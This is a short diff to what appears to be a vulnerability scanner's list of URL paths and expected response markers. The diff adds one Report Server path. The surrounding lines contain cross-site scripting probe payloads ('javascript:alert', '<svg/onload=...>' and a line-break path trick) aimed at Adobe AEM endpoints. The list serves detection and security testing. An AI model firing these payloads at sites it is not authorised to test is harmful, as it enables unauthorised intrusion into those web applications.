@@ -7,3 +7,4 @@
 '/en/embeddedAuthRedirect.html?auth=javascript:alert("xElkomy")' 'loadingIndicator'
 '/libs/dam/merge/metadata.html?path=%3Csvg/onload=prompt(%27xElkomy%27)%3E&.ico' '{"assetPaths":'
 '/crx/de/setPreferences.jsp;%0ATia.html?keymap=<svg/onload=alert(document.domain)>&language=0' 'A JSONObject '
+'/REPORTSERVER/Pages/ReportViewer.aspx' 'ReportViewerControl'
